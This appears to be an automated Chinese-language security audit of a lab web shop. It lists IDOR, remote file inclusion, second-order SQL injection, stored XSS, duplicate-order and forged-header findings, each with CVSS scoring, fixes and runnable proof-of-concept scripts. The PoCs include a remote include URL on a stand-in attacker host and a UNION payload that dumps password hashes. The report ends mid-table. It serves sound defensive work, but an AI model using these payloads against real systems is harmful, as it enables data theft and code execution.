{'filename': 'idor_order_detail.sh', 'language': 'bash', 'script': '#!/bin/bash\n# 需自备两个账号的 Cookie：COOKIE_A（攻击者）、订单 id 属于账号 B\nBASE=${BASE:-http://target}\nCOOKIE=${COOKIE_A:?set COOKIE_A to attacker session cookie}\nfor id in 1 2 3 4 5; do\n  echo "== id=$id =="\n  curl -s -H "Cookie: $COOKIE" -H \'Accept: application/json\' "$BASE/orders/detail.php?id=$id"\ndone', 'instructions': '注册并登录攻击者账号取得 Cookie，将其放入 COOKIE_A；对目标 URL 依次请求存在的他人订单 id，观察是否返回他人 username/total/private_note。', 'normal_input': 'GET /orders/detail.php?id=<攻击者自己的订单>', 'attack_input': 'GET /orders/detail.php?id=<他人订单>&Header: Accept: application/json', 'expected_result': '对他人订单 id 返回 200 与包含他人购买人、金额、private_note 的 JSON，而非 403/404。'}
````

- orders/detail.php 按可控 $_GET[id] 直接查询订单，未与 $_SESSION user_id 比对，任意登录用户可读他人订单（含 private_note）（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `5ede16ccd190465bbe7ac4e447a58601` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/detail.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/public/orders/index.php', 'start_line': 2, 'end_line': 2}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：detail.php 第2行仅 require_user() 取得会话用户，却未使用该用户过滤查询：SQL 为 WHERE o.id=?，参数直接取自 $_GET["id"]，随后第3行在 Accept: application/json 时 json_response($o) 原样返回整条订单（含购买人 username、金额 total、private_note）。任意注册用户只需遍历 id 即可读取他人订单，缺少 o.user_id = 当前用户 的归属条件。订单列表 index.php 第2行确实以 user_id=? 绑定 $u["id"]，说明列表侧防护存在，而详情侧缺失，形成同类 IDOR。
  输入：HTTP GET 参数 id（?id=<他人订单号>）
  传播：detail.php:2 $_GET["id"] -> $q->execute([$_GET["id"]??0]) -> $o -> detail.php:3 json_response($o)
  危险操作：按攻击者控制的主键读取并返回任意订单记录（购买人、金额、私密备注）
  保护：仅有 require_user() 登录校验；查询无 o.user_id = 会话用户 的附加条件，也无后续归属比较
  前提：['持有任意有效登录会话（开放注册即可获得）；目标订单 id 存在']
  修复建议：查询改为 WHERE o.id=? AND o.user_id=?，绑定 $u["id"]，并在返回前校验归属；或对无权限一律返回 404。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:53:12.327671+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 订单详情通过 HTTP 公开接口访问 | lab30-shop/app/public/orders/detail.php:1-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需替换 id 数值即可遍历读取 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录会话，但注册即可自助获得 | lab30-shop/app/src/bootstrap.php:33-37 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需受害者交互 | lab30-shop/app/public/orders/detail.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用内越权读取 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 返回他人订单全部字段含私密备注 | lab30-shop/app/public/orders/detail.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅为读取，无写操作 | lab30-shop/app/public/orders/detail.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/orders/detail.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'orders_idor_poc.py', 'language': 'python', 'script': 'import sys, json, urllib.request, http.cookiejar\nbase=sys.argv[1].rstrip("/")\ncj=http.cookiejar.CookieJar()\nop=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\nop.open(base+"/auth/register.php", data=b"username=audit%d&password=Passw0rd!123&display_name=a" % __import__("random").randint(1,10**6)).read()\nfor oid in range(1,20):\n    req=urllib.request.Request(base+"/orders/detail.php?id=%d"%oid, headers={"Accept":"application/json"})\n    try:\n        body=op.open(req).read()\n    except Exception as e:\n        body=str(e).encode()\n    print(oid, body[:200])\n', 'instructions': '以 Python3 运行，参数为靶场基地址（如 http://target）。脚本自行注册账号并保持 cookie，然后遍历订单 id 请求 /orders/detail.php?id=N 并带上 Accept: application/json。', 'normal_input': 'GET /orders/detail.php?id=<自己创建的订单 id>', 'attack_input': 'GET /orders/detail.php?id=1（Accept: application/json，1 属他人订单）', 'expected_result': '对照请求仅返回自己的订单；攻击请求返回他人订单的 order_no、购买人 username、total 与 private_note，证明缺少归属校验。'}
````


### 台账 `1d31c3b79a8040a3810985945c1f137e`

- ops/template-preview.php 将 GET template 直接传入 include，实现任意远程/本地文件包含（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `f2066e8c348d49a9b364e96d5063cab6` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/template-preview.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：template-preview.php 第2行取 $_GET['template']，第3行在 $template!=='' 时直接 include $template，无白名单、无协议限制。默认示例值本身为 http:// URL，说明预期 allow_url_include 可用。operator/admin 会话可含入并执行远程 PHP 或含本地任意文件。
  输入：HTTP GET template
  传播：$_GET['template'] -> $template -> include $template
  危险操作：include 用户完全控制的路径/URL
  保护：仅 require_user(['operator','admin']) 限制角色，对 include 目标无校验
  前提：['持有 operator 或 admin 会话；allow_url_include=On']
  修复建议：用固定白名单映射 include 目标，禁用 URL 包装器。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:38:07.658091+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 可达 | lab30-shop/app/public/ops/template-preview.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接传 URL | lab30-shop/app/public/ops/template-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 会话 | lab30-shop/app/public/ops/template-preview.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无受害者交互 | lab30-shop/app/public/ops/template-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 应用进程内 | lab30-shop/app/public/ops/template-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读任意本地文件 | lab30-shop/app/public/ops/template-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可执行远程 PHP | lab30-shop/app/public/ops/template-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 代码执行威胁服务可用性 | lab30-shop/app/public/ops/template-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'rfi_template_preview.sh', 'language': 'bash', 'script': "curl -s -b 'SHOPSESSID=<operator_sid>' 'http://TARGET/ops/template-preview.php?template=http://ATTACKER/evil.php'", 'instructions': '以 operator 会话访问该 URL，远程 PHP 被执行', 'normal_input': 'template=/resources/views/home.php', 'attack_input': 'template=http://attacker/evil.php', 'expected_result': '远程 PHP 执行并回显；对照仅正常渲染'}
````

- 运营模板预览对 $_GET 直接 include 且 allow_url_include 开启可导致 RFI（CVSS 3.1 Base 7.5 (high) · CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `fc625ae46ec54cacaa873e0cff2f6c5b` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/template-preview.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/docker/php.ini', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：template-preview.php 将 $_GET['template'] 直接传入 include，且 php.ini 开启 allow_url_include，远程 URL 中的 PHP 内容会被包含执行，形成 RFI。已通过 require_user 限制 operator/admin，但攻击者若能获得该角色或利用其他漏洞提权即可远程代码执行。
  输入：GET 参数 template
  传播：$template=(string)($_GET['template']??'') 直接传入 include $template
  危险操作：include 远程 URL
  保护：require_user(['operator','admin']) 限制角色，但 allow_url_include=On 使 URL 包含生效
  前提：['攻击者拥有 operator 或 admin 账号；PHP allow_url_include=On']
  修复建议：关闭 allow_url_include，改用固定模板白名单，禁止 include 用户可控路径。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:41:59.857605+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 可通过 HTTP 访问模板预览入口 | lab30-shop/docker/apache.conf:2-9 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需要 operator/admin 账号且能控制含 PHP 代码的远程资源 | lab30-shop/app/public/ops/template-preview.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要已认证 operator 或 admin 权限 | lab30-shop/app/public/ops/template-preview.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身触发请求 | lab30-shop/app/public/ops/template-preview.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在 Web 进程上下文中执行 | lab30-shop/app/public/ops/template-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 任意 PHP 代码执行可读取全部应用数据 | lab30-shop/app/src/bootstrap.php:6-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 代码执行可写入/修改数据 | lab30-shop/app/public/ops/template-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 代码执行可破坏服务 | lab30-shop/app/public/ops/template-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `c69fbc2e3f51448ba5c70f09c96bcb39`

- ops/report.php 用用户可自改的 nickname 拼接 SQL，形成存储式二次 SQL 注入（CVSS 3.1 Base 6.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N，验证：unverified）
  来源 `1cc8f314f104413ca022a0b4a50c89c4` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/report.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/public/account/update.php', 'start_line': 4, 'end_line': 6}]
  结论：report.php 先按 user_id 取出 nickname，再把 nickname 直接拼接进第二句 SQL 执行 db()->query(...WHERE nickname='".$nickname."')。nickname 可由任意登录用户在 account/update.php 自设（第5-6行仅列名白名单，值内容任意）。设置 nickname 为注入串后，运营访问报表即被注入，可 UNION 读任意表。
  输入：users.nickname（用户自设）
  传播：$_POST['nickname'] -> UPDATE users -> report.php $nickname -> 字符串拼接 -> query()
  危险操作：未参数化拼接执行 query()
  保护：第一句用 prepare；第二句 query() 直接拼接，无转义
  前提：['攻击者注册/登录并可改自己 nickname；运营访问 report.php 查看该用户']
  修复建议：第二句 SQL 改用 prepare 参数绑定。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:38:07.659020+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 可达 | lab30-shop/app/public/ops/report.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 改昵称后由运营触发即可 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需普通登录账户 | lab30-shop/app/public/account/update.php:5-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需运营访问报表页 | lab30-shop/app/public/ops/report.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一数据库上下文 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可 UNION 读任意表 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 查询可被构造写操作 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接可用性破坏证据 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_report.sh', 'language': 'bash', 'script': "curl -s -b 'SHOPSESSID=<attacker_sid>' -d 'csrf=<t>&nickname=x%27%20UNION%20SELECT%20username,password_md5,role%20FROM%20users--%20-' http://TARGET/account/update.php\ncurl -s -b 'SHOPSESSID=<operator_sid>' -H 'Accept: application/json' 'http://TARGET/ops/report.php?user_id=<attacker_id>'", 'instructions': '先设恶意昵称，运营访问报表后 JSON 返回注入结果', 'normal_input': 'nickname=alice', 'attack_input': "nickname=x' UNION SELECT username,password_md5,role FROM users-- -", 'expected_result': 'members 返回注入出的密码哈希数据'}
````


### 台账 `35cb594a16274ac79907a659717056d0`

- support/messages.php 将用户留言原样拼入 HTML 输出导致存储型 XSS（CVSS 3.1 Base 4.6 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N，验证：unverified）
  来源 `361a151dfc4746b7a953514e9dfc6a4f` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/support/messages.php', 'start_line': 3, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}]
  结论：messages.php 第3行把 $_POST['message'] 仅校验长度后通过预处理写入 messages 表；第4行读出全部记录；第5行渲染时 display_name 与 created_at 用 h() 转义，但 $row['message'] 直接拼进 <div class="message-body">，未做任何 HTML 转义，因此任意登录用户提交的 <script> 等载荷会被所有浏览该页用户执行，构成存储型 XSS。
  输入：POST 参数 message（任意已登录用户）
  传播：$_POST['message'] -> INSERT INTO messages -> SELECT m.* -> 字符串拼接输出
  危险操作：echo '<div class="message-body">'.$row['message'].'</div>'
  保护：同页对其他字段使用 h()，唯独 message 字段遗漏；仅限制长度与 CSRF，不防 XSS
  前提：['攻击者拥有普通账号并通过 check_csrf']
  修复建议：输出时对 message 使用 h($row['message'])，如需富文本则使用白名单净化库

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:38:49.266532+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 留言经 Web 页面渲染 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 任意登录用户直接提交，无需额外条件 | lab30-shop/app/public/support/messages.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录（require_user），注册即可 | lab30-shop/app/public/support/messages.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需其他用户浏览留言页面 | lab30-shop/app/public/support/messages.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同源脚本执行 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可读取会话中可见数据 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可在页面上下文发起请求 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接可用性影响 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'xss_s_messages.html', 'language': 'html', 'script': '<form method="post" action="http://target/support/messages.php"><input name="csrf" value="<登录后页面中的csrf值>"><textarea name="message"><script>alert(document.cookie)</script></textarea><button>submit</button></form>', 'instructions': '登录后从留言页取 csrf，提交该表单；再以任意用户访问 /support/messages.php 观察脚本执行。目标入口 http://target/support/messages.php', 'normal_input': 'message=你好，想咨询配送时效', 'attack_input': 'message=<script>alert(document.cookie)</script>', 'expected_result': '正常留言显示为纯文本；攻击留言在页面中作为脚本执行弹出 cookie'}
````

- support/messages.php 未转义回显已保存留言，导致存储型 XSS（CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N，验证：unverified）
  来源 `6b8dcaec369f4a9392c580608d7973c9` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/support/messages.php', 'start_line': 2, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 38, 'end_line': 40}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 50, 'end_line': 50}]
  结论：任意已登录用户向 POST /support/messages.php 提交 message 字段，第3行仅做空值与长度校验后用预处理语句存入 messages 表；第5行渲染列表时把 $row['message'] 直接 echo 拼进 .message-body div，未调用 bootstrap.php:10 定义的 h()，而同行的 display_name、created_at 均已转义。攻击者可控 HTML/JS 被持久化，任何浏览留言页的用户（含运营/管理员）都在同源执行，可读取页面 CSRF token 并代表其发起写操作。写入与读取 SQL 均无拼接，故风险集中于输出转义。
  输入：POST /support/messages.php 表单字段 $_POST['message']
  传播：messages.php:3 $_POST['message'] -> INSERT INTO messages(user_id,message) 持久化 -> messages.php:4 SELECT m.* 读回 -> messages.php:5 echo '<div class="message-body">'.$row['message'].'</div>'
  危险操作：未经 htmlspecialchars 的用户数据拼接进 HTML 响应（messages.php:5 echo）
  保护：仅 check_csrf() 防跨站请求伪造与 strlen<=5000 长度限制；输出侧无 h()/htmlspecialchars，页面未设置 CSP（bootstrap.php:50 只设 Content-Type）。预处理语句只防 SQL 注入，不影响 HTML 注入。
  前提：['攻击者需拥有任意普通账号（注册即可）并在留言页取得 csrf token 后提交；受害者浏览 /support/messages.php 时触发。']
  修复建议：将第5行改为 nl2br(h($row['message']))；如需富文本则先做白名单过滤，并增加 CSP 作为纵深防御。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:52:58.673873+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 留言页经公网访问 | lab30-shop/app/public/support/messages.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 普通表单提交即可植入 payload | lab30-shop/app/public/support/messages.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 要求已登录，注册即可获得 | lab30-shop/app/public/support/messages.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者浏览留言列表页才执行 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | C | 脚本在同源执行，可读取 csrf_token 并代表受害者调用接口 | lab30-shop/app/src/bootstrap.php:38-40 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可读取受害者页面数据与会话相关 token | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可代表受害者在同源发起写操作 | lab30-shop/app/src/bootstrap.php:40-40 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响证据 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'support_messages_xss.py', 'language': 'python', 'script': 'import re, sys, random, urllib.parse, urllib.request, http.cookiejar\n\nbase = sys.argv[1].rstrip("/")\njar = http.cookiejar.CookieJar()\nop = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))\npayload = "<script>alert(document.domain)</script>"\nname = "xssdemo%d" % random.randint(1000, 9999)\nreg = urllib.parse.urlencode({"username": name, "email": name + "@example.com", "password": "Passw0rd!123", "display_name": name}).encode()\ntry:\n    op.open(base + "/auth/register.php", reg).read()\nexcept Exception as e:\n    print("register:", e)\npage = op.open(base + "/support/messages.php").read().decode("utf-8", "replace")\nm = re.search(r\'name="csrf" value="([0-9a-f]+)"\', page)\ntok = m.group(1) if m else ""\ndata = urllib.parse.urlencode({"csrf": tok, "message": payload}).encode()\nop.open(base + "/support/messages.php", data).read()\nout = op.open(base + "/support/messages.php").read().decode("utf-8", "replace")\nprint("PAYLOAD_ECHOED_UNESCAPED:", payload in out)\n', 'instructions': '针对目标基址运行 python3 support_messages_xss.py http://<host>；脚本注册普通账号、读取留言页 csrf token、提交含 script 标签的留言，然后重新加载留言页判断 payload 是否原样出现在响应中。', 'normal_input': 'message=你好，请问多久发货？', 'attack_input': 'message=<script>alert(document.domain)</script>', 'expected_result': '正常留言在 .message-body 中显示为纯文本；攻击留言在响应 HTML 中未经转义地出现 <script>alert(document.domain)</script>，浏览器加载留言页即执行。'}
````


### 台账 `006baaff94a7448d90f0612dab828d4a`

- orders/create.php 创建订单缺少幂等/去重保护，重复提交导致重复下单与重复扣库存（CVSS 3.1 Base 4.2 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L，验证：unverified）
  来源 `a4f346eb1ad5490aab116d05c5b4969b` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/create.php', 'start_line': 2, 'end_line': 7}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 40, 'end_line': 40}]
  结论：create.php 第5-7行在事务内先按 stock>=? 扣库存再插入订单，但请求中没有一次性令牌或幂等键，check_csrf() 仅校验会话 CSRF token（同一 token 可重复使用）。同一已认证用户重复提交相同 POST（或并发多请求）会多次通过校验，每次各扣一次库存并插入一条新订单，造成重复下单与重复扣库存。库存条件更新防止单次超卖，但不阻止重复扣减。
  输入：重复/并发的 POST /orders/create.php（product_id、quantity、price、csrf 均为攻击者已持有值）
  传播：require_post/check_csrf 通过 -> 读取商品 -> 扣库存(第6行) -> 插入订单(第7行) -> commit，整个链路无可重放控制
  危险操作：第6行 UPDATE products SET stock=stock-? 与第7行 INSERT INTO orders 在无幂等约束下重复执行
  保护：仅有 CSRF token 与 stock>=? 条件更新；均不限制同一请求重放或并发重复提交
  前提：['任意有效登录会话与对应 CSRF token']
  修复建议：在下单表单中加入一次性提交令牌（使用后失效），或对 (user_id, 请求幂等键) 建唯一约束并在插入冲突时回滚。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:39:04.679793+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 Web 表单直接可达 | lab30-shop/app/public/orders/create.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需在并发窗口或重复提交同一请求，无一次性令牌限制 | lab30-shop/app/public/orders/create.php:5-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需有效登录会话与 CSRF token（注册即可获得） | lab30-shop/app/public/orders/create.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身账户即可重复提交 | lab30-shop/app/public/orders/create.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响限于攻击者自身账户订单与商品库存 | lab30-shop/app/public/orders/create.php:6-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 无数据泄露证据 | lab30-shop/app/public/orders/create.php:7-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 重复下单与重复扣库存改变订单与库存状态 | lab30-shop/app/public/orders/create.php:6-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | L | 并发或重复提交可消耗库存资源 | lab30-shop/app/public/orders/create.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'dup_order_poc.sh', 'language': 'bash', 'script': '#!/bin/bash\n# 需已登录并持有 CSRF token 与 Cookie\nBASE="http://target"\nCOOKIE="SHOPSESSID=..."\nCSRF="..."\nfor i in 1 2 3; do\n  curl -s -b "$COOKIE" -X POST "$BASE/orders/create.php" -d "product_id=1&quantity=1&price=1&csrf=$CSRF" -o /dev/null -w "%{http_code}\\n"\ndone', 'instructions': '用有效会话的 Cookie 与 csrf 值替换占位符，对 /orders/create.php 连续发送相同请求，然后在 /orders/index.php 观察是否生成多条订单且库存被多次扣减。', 'normal_input': '单次合法下单请求', 'attack_input': '连续三次提交同一 product_id/quantity/price/csrf', 'expected_result': '订单列表出现多条重复订单，商品库存被扣减多次'}
````


### 台账 `6d04a38fa5174154925b7c7b09f0c4ff`

- ops/maintenance.php 仅凭可伪造 HTTP_X_ADMIN:1 请求头通过服务鉴权并入队作业（CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N，验证：unverified）
  来源 `568c5b2586e94776a18c2df887bc9d33` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/maintenance.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：maintenance.php 第 2 行只 require bootstrap，未调用任何会话/身份校验函数；第 3 行用 ($_SERVER['HTTP_X_ADMIN']??'')!=='1' 判定服务身份，HTTP 请求头完全由客户端控制。任意未登录攻击者发送 X-Admin: 1 即通过，第 4 行 POST 时执行 INSERT INTO jobs 写入作业，第 5 行进一步返回 authorized=true。bootstrap.php:33-37 的 require_user 在本文件中从未调用，因此不存在会话校验兜底。
  输入：HTTP 请求头 X-Admin（映射为 $_SERVER['HTTP_X_ADMIN']）
  传播：line 3 头值 !=='1' 则 fail_request；等于 '1' 进入 line 4
  危险操作：db()->prepare(...)->execute 向 jobs 表插入作业记录并回显 job_id
  保护：无：未调用 require_user/user()，无 IP/签名/HMAC 校验
  前提：['可直接访问 /ops/maintenance.php；发送 X-Admin: 1（POST 时触发写入）']
  修复建议：改为服务端校验：使用 require_user 会话身份或共享密钥 HMAC/签名校验，切勿信任客户端可设置的请求头。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:39:38.856565+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Web 接口可远程直接访问 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需设置一个固定请求头值 1 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
